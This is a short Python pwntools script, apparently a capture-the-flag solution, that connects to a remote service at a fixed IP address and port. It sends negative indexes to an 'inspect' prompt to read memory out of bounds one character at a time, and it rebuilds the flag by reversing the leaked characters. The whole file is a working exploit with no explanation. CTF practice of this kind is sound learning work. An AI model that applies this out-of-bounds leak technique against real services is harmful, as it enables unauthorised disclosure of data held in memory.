#!/usr/bin/python3

from pwn import *
r = remote('23.146.248.230', 12343)

r.sendlineafter(b'input: ', b'any')
flag = b''
for i in range(-12, -100, -1):
	r.sendlineafter(b'inspect: ', str(i).encode())
	r.recvuntil(b"is '")
	char = r.recvn(1)
	if char == b'{':
		flag += char
		break
	else:
		flag += char
print(flag.decode()[::-1])

r.interactive()